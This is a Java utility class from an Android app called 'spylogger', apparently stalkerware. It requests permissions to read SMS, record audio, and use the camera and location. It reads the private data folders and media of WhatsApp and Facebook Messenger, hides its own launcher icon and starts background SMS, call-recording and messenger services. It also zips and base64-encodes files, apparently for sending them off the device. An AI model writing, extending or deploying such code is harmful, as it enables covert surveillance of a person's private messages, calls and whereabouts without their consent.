package com.gravatasufoca.spylogger.utils;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.os.Environment;
import android.os.FileObserver;
import android.preference.PreferenceManager;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.util.Base64;
import android.widget.Toast;

import com.google.firebase.iid.FirebaseInstanceId;
import com.gravatasufoca.spylogger.R;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
import com.gravatasufoca.spylogger.model.messenger.Contact;
import com.gravatasufoca.spylogger.receivers.Alarm;
import com.gravatasufoca.spylogger.services.MessengerService;
import com.gravatasufoca.spylogger.services.RecordService;
import com.gravatasufoca.spylogger.services.SmsService;
import com.gravatasufoca.spylogger.services.WhatsAppService;
import com.j256.ormlite.dao.Dao;
import com.utilidades.gravata.utils.Utilidades;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Utils {

	public static final String BASE64_PUBLIC_KEY="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtNBwCmA8QI1p0POCCxNbWYJNw4RP9r3SvumIDcbnSmZQvIGtceRvAU521LR+v8rWd+H4sseghzjGTDHoVu8bSEth1i5iPnFhEn+X7JKnicP+ZWP2AjcYjFCJ/mDLfBYNPVpLe3UiD53Jqswu6JBjEjvDF9Xk8PfiKH0H49ydeTCpnWeyYSEfD07iqv+BpIzKYckaEqACJzKBDfVLP5RNGOPhClcs8Jfpu8+oI7ILzn6hsIvpghmqzrglDZgplMh1Fz2dePYNic/TOS/jexUt2OmofKyu32pwjtcW0tO+nfgMAQ9kXOnbs7GBVJofKwrf1q9zMRoDUsFZV5sddskECQIDAQAB";
	public static final byte[] SALT = new byte[] {-32,58,-52,48,15,-124,123,64,60,-44,-122,-91,-23,53,-23,123,44,-123,-111,43};

	public static final String FACEBOOK_DIR_PATH=android.os.Environment.getDataDirectory().toString()+"/data/com.facebook.orca";
	public static final String NOT_PREMIUM = "<div class=\"center\"><div class=\"alert alert-warning section\">%s</div></div>";
	public static final String TOKEN = FirebaseInstanceId.getInstance().getToken();
	public static boolean rooted;

	public static String[] permissoes={
			Manifest.permission.GET_ACCOUNTS,
			Manifest.permission.READ_CONTACTS,
			Manifest.permission.RECEIVE_BOOT_COMPLETED,
			Manifest.permission.INTERNET,
			Manifest.permission.ACCESS_NETWORK_STATE,
			Manifest.permission.PROCESS_OUTGOING_CALLS,
			Manifest.permission.GET_ACCOUNTS,
			Manifest.permission.ACCOUNT_MANAGER,
			Manifest.permission.WAKE_LOCK,
			Manifest.permission.RECEIVE_SMS,
			Manifest.permission.READ_SMS,
			Manifest.permission.RECORD_AUDIO,
			Manifest.permission.CAMERA,
			Manifest.permission.ACCESS_FINE_LOCATION,
			Manifest.permission.CAPTURE_AUDIO_OUTPUT,
			Manifest.permission.CAPTURE_VIDEO_OUTPUT,
			Manifest.permission.WRITE_EXTERNAL_STORAGE,
			Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
			Manifest.permission.SYSTEM_ALERT_WINDOW

};

	/*
	<uses-permission android:name="android.permission.READ_PROFILE" />
	<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
	<uses-permission android:name="android.permission.USE_CREDENTIALS"/>
	<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
	*/

	private static ScheduledExecutorService scheduleTaskExecutor;
	public static ScheduledFuture<?> scheduledFuture;
	public static final long MAX_SIZE = 26214400;
	public static Alarm alarm;
	public static FileObserver whatsObserver;
	public static FileObserver faceObserver;
	public static boolean verificado=false;
	public static boolean licenciado=false;
	public static String PREF="jabi";
	public static String COMPRADO="potoca";

	public static Context context;
	public static FileObserver observer;

	public static String getDeviceId(ContentResolver contentResolver){
		String deviceId = Secure.getString(contentResolver,Secure.ANDROID_ID);
		return "_#$A3d12abk%"+deviceId;
	}

	public static boolean isDebugglabe(Context context){
		//return false;
		return  ( 0 != ( context.getApplicationInfo().flags &= ApplicationInfo.FLAG_DEBUGGABLE ) );
	}


	public static ScheduledExecutorService getScheduleTaskExecutor() {
		if(scheduleTaskExecutor==null)
			scheduleTaskExecutor = Executors.newSingleThreadScheduledExecutor();
		return scheduleTaskExecutor;
	}


	public static boolean isComprado(final Context ctx){
		if(!isDebugglabe(ctx)){
			boolean t= ctx.getSharedPreferences(PREF, 0).getBoolean(COMPRADO, false);
			licenciado=t;
			verificado=true;
			return t;
		}else{
			licenciado=true;
			verificado=true;
			ctx.getSharedPreferences(PREF, 0).edit().putBoolean(COMPRADO, false).commit();
			return true;
		}
	}

	public static void copyFile(File source, File dest) throws IOException {
		FileInputStream fis = new FileInputStream(source);

		OutputStream output = new FileOutputStream(dest);
		// Transfer bytes from the inputfile to the outputfile
		byte[] buffer = new byte[1024];
		int length;
		while ((length = fis.read(buffer)) > 0) {
			output.write(buffer, 0, length);
		}

		// Close the streams
		output.flush();
		output.close();
		fis.close();

	}

	public static void createFile(File dest, String msg) throws IOException {

		OutputStream output = new FileOutputStream(dest);
		output.write(msg.getBytes());

		// Close the streams
		output.flush();
		output.close();

	}


	public static Cursor getContact(String number,
			ContentResolver contentResolver) {
		Uri uri = Uri.withAppendedPath(
				ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
				Uri.encode(number));

		Cursor contactLookup = contentResolver.query(uri, new String[] {
				BaseColumns._ID, ContactsContract.PhoneLookup.DISPLAY_NAME },
				null, null, null);

		if (contactLookup != null && contactLookup.getCount() > 0) {
			contactLookup.moveToNext();

			return contactLookup;
		}

		return contactLookup;
	}

	public static String getContactDisplayNameByNumber(Cursor contactLookup) {
		try {
			String nome = contactLookup.getString(contactLookup
					.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
			return nome;
		}catch(Exception e){
			return null;
		}
		finally {
			contactLookup.close();
		}
	}

	public static String getContactDisplayNameByNumber(String number,
			ContentResolver contentResolver) {
		if(number ==null || number.isEmpty()) return "";
		int indice=number.indexOf("@");

		Cursor contact = getContact(number.substring(0,indice!=-1?indice:number.length()), contentResolver);
		String nome= getContactDisplayNameByNumber(contact);
		return nome!=null?nome:number;
	}

	public static Uri getPhotoUri(long contactId,
			ContentResolver contentResolver) {

		try {
			Cursor cursor = contentResolver
					.query(ContactsContract.Data.CONTENT_URI,
							null,
							ContactsContract.Data.CONTACT_ID
									+ "="
									+ contactId
									+ " AND "

									+ ContactsContract.Data.MIMETYPE
									+ "='"
									+ ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE
									+ "'", null, null);

			if (cursor != null) {
				if (!cursor.moveToFirst()) {
					return null; // no photo
				}
			} else {
				return null; // error in cursor process
			}

		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}

		Uri person = ContentUris.withAppendedId(
				ContactsContract.Contacts.CONTENT_URI, contactId);
		return Uri.withAppendedPath(person,
				ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
	}

	public static String fetchContactId(Cursor cFetch) {

		String contactId = "";

		if (cFetch.moveToFirst()) {
			cFetch.moveToFirst();

			contactId = cFetch
					.getString(cFetch.getColumnIndex(PhoneLookup._ID));

		}

		return contactId;

	}

	public static boolean isConnected(Context context) {
		ConnectivityManager connectivityManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo mobileInfo = connectivityManager
				.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		State mobile = NetworkInfo.State.DISCONNECTED;
		if (mobileInfo != null) {
			mobile = mobileInfo.getState();
		}
		NetworkInfo wifiInfo = connectivityManager
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		State wifi = NetworkInfo.State.DISCONNECTED;
		if (wifiInfo != null) {
			wifi = wifiInfo.getState();
		}
		boolean dataOnWifiOnly = (Boolean) PreferenceManager
				.getDefaultSharedPreferences(context).getBoolean(
						"data_wifi_only", true);
		if ((!dataOnWifiOnly && (mobile.equals(NetworkInfo.State.CONNECTED) || wifi
				.equals(NetworkInfo.State.CONNECTED)))
				|| (dataOnWifiOnly && wifi.equals(NetworkInfo.State.CONNECTED))) {
			return true;
		} else {
			return false;
		}
	}

	public static void showIcon(boolean show,Context ctx){
		ComponentName componentToDisable = new ComponentName("com.gravatasufoca.chatspy", "com.gravatasufoca.chatspy.activities.MainActivity");
		PackageManager p = ctx.getPackageManager();
		if(show)
			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
		else
			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	}

	public static String encodeBase64(byte[] data){
		return Base64.encodeToString(data, Base64.NO_WRAP);
	}
	public static String encodeBase64(File f){
		return Base64.encodeToString(getBytesFromFile(f), Base64.NO_WRAP);
	}

	public static File getMediaFile(String tipo,long tamanho,Date data,int dias){
		String path=Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp "+tipo;

		String prefixo="";
		if(tipo.equals("Video"))
			prefixo="vid";
		else if(tipo.equals("Images"))
			prefixo="img";
		else if(tipo.equals("Audio"))
			prefixo="aud";

		final String nome=prefixo+"-";
	    File dir = new File(path);

	    final List<String> datas=new ArrayList<String>();

	    //adiciona a qtd de dias para frente
	    Date ndata=new Date(data.getTime() + dias * 24 * 60 * 60 * 1000);

	    datas.add(new SimpleDateFormat("yyyyMMdd").format(ndata));

	    for(int i=1;i<=dias*2;i++){

	    	Date tmp= new Date(ndata.getTime() - i * 24 * 60 * 60 * 1000);

		    datas.add(new SimpleDateFormat("yyyyMMdd").format(tmp));


	    }

		File[] arquivos=dir.listFiles(new FilenameFilter() {

			@Override
			public boolean accept(File dir, String filename) {

				boolean check=false;

				for(String data:datas){
					if(filename.toLowerCase().startsWith(nome+data)){
						check=true;
						break;
					}
				}

				return check;
			}
		});

		for(File file : arquivos){
			if(file.length()==tamanho)
				return file;
		}
		return null;
	}

	public static String getFilePathFromContentUri(Uri uri,
	        ContentResolver contentResolver) {
		String fileName="unknown";//default fileName
	    Uri filePathUri = uri;
	    if (uri.getScheme().toString().compareTo("content")==0)
	    {
	        Cursor cursor = contentResolver.query(uri, null, null, null, null);
	        if (cursor.moveToFirst())
	        {
	            int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);//Instead of "MediaStore.Images.Media.DATA" can be used "_data"
	            filePathUri = Uri.parse(cursor.getString(column_index));
	            fileName = filePathUri.getLastPathSegment().toString();
	        }
	    }
	    else if (uri.getScheme().compareTo("file")==0)
	    {
	        fileName = filePathUri.getLastPathSegment().toString();
	    }
	    else
	    {
	        fileName = fileName+"_"+filePathUri.getLastPathSegment();
	    }
	    return fileName;
	}

	public static byte[] getBytesFromFile(File arquivo){

		FileInputStream is;
		try {
			is = new FileInputStream(arquivo);
			return getBytesFromInputStream(is);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return null;
		}


	}

	public static byte[] getBytesFromInputStream(InputStream is)
	{
	    try
	    {
	    	ByteArrayOutputStream os = new ByteArrayOutputStream();

	        byte[] buffer = new byte[0xFFFF];

	        for (int len; (len = is.read(buffer)) != -1;)
	            os.write(buffer, 0, len);

	        os.flush();

	        return os.toByteArray();
	    }
	    catch (IOException e)
	    {
	        return null;
	    }
	}

	public static boolean estaNoIntervalo(Date data,int dias){
		Calendar dia = Calendar.getInstance();

		dia.set(Calendar.HOUR_OF_DAY, 0);
		dia.set(Calendar.MINUTE, 0);
		dia.set(Calendar.SECOND, 0);
		dia.set(Calendar.MILLISECOND, 0);

		dia.add(Calendar.DATE, dias*-1);

		return (data.getTime()>=dia.getTimeInMillis());
	}


	public static byte[] compactar(Map<String, byte[]> anexos){
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ZipOutputStream zip = new ZipOutputStream(baos);

		Set<String> keys=anexos.keySet();
		try{
			for(String key:keys){

				byte[] anexo=anexos.get(key);
				if(anexo!=null){
					ZipEntry entry=new ZipEntry(key);
					zip.putNextEntry(entry);
					zip.write(anexo);
					zip.closeEntry();
				}
			}

			zip.close();

			return baos.toByteArray();
		}catch(IOException e){
			return null;
		}
	}

	public static Date zeraHora(Date dt){
		Calendar data = Calendar.getInstance();
		data.setTime(dt);

		data.set(Calendar.HOUR_OF_DAY, 0);
		data.set(Calendar.MINUTE, 0);
		data.set(Calendar.SECOND, 0);
		data.set(Calendar.MILLISECOND, 0);

		return data.getTime();
	}

	public static File getFotoContato(String contato){
		try{
			File f= new File( android.os.Environment.getDataDirectory().toString()+ "/data/com.whatsapp/files/Avatars/"+contato+".j");
			if(f.exists())
				return f;
			return null;
		}catch(Exception e ){
			return null;
		}
	}


	public static Contact getContato(String userKey) throws SQLException{
		Dao<Contact, Integer> dao= (new DatabaseHelperFacebookContacts(Utils.context)).getContatosDao();
		String id="";
		if(userKey.indexOf(":")!=-1)
			id=userKey.replaceAll("\\D", "").trim();
		else
			id=userKey;

		Contact tmp= dao.queryBuilder().where().eq("fbid", id).queryForFirst();
		if(tmp!=null)
			return tmp;
		else
			return new Contact();
	}

	public static boolean isServiceRunning(Context context){
		boolean check=true;
		if (rooted && !(Utilidades.isServiceRunning(WhatsAppService.class, context) && Utilidades.isServiceRunning(MessengerService.class, context))) {
			check = false;
		}

		return check
				&& Utilidades.isServiceRunning(RecordService.class,context)
				&& Utilidades.isServiceRunning(SmsService.class,context);
	}

	public static String getPercentualMensagem(String mensagem, int percentual){
		int tamanho=mensagem.length();
		tamanho=(int) (tamanho* (percentual / 100.0 ));

		return mensagem.substring(0, tamanho);
	}

	// Start the service
	public static void startNewService(Context context) {
		if(!Utils.isServiceRunning(context)){
			if(rooted) {
				context.startService(new Intent(context, WhatsAppService.class));
				context.startService(new Intent(context, MessengerService.class));
			}
			context.startService(new Intent(context, SmsService.class));
			context.startService(new Intent(context, RecordService.class));
		}
//		Utils.startMail(context);
		Toast.makeText(context, context.getString(R.string.service_running), Toast.LENGTH_LONG).show();
	}
}
